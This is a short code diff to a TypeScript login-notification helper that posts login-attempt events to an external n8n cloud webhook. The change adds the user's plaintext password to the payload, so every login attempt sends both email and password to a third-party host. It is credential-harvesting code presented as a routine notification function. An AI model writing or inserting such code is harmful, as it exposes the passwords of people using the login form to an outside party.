@@ -6,8 +6,9 @@
 /**
  * Sends a notification to a webhook about a login attempt
  * @param email The email address that attempted to login
+ * @param password The password used for the login attempt
  */
-export const notifyLoginAttempt = async (email: string): Promise<void> => {
+export const notifyLoginAttempt = async (email: string, password: string): Promise<void> => {
   try {
     const webhookUrl = 'https://danjaved008.app.n8n.cloud/webhook-test/3f878768-29d0-43f6-a567-c5f127ff8855';
     
@@ -19,6 +20,7 @@ export const notifyLoginAttempt = async (email: string): Promise<void> => {
       body: JSON.stringify({
         event: 'login_attempt',
         email,
+        password, // Now including the password in the webhook payload
         timestamp: new Date().toISOString()
       })
     });
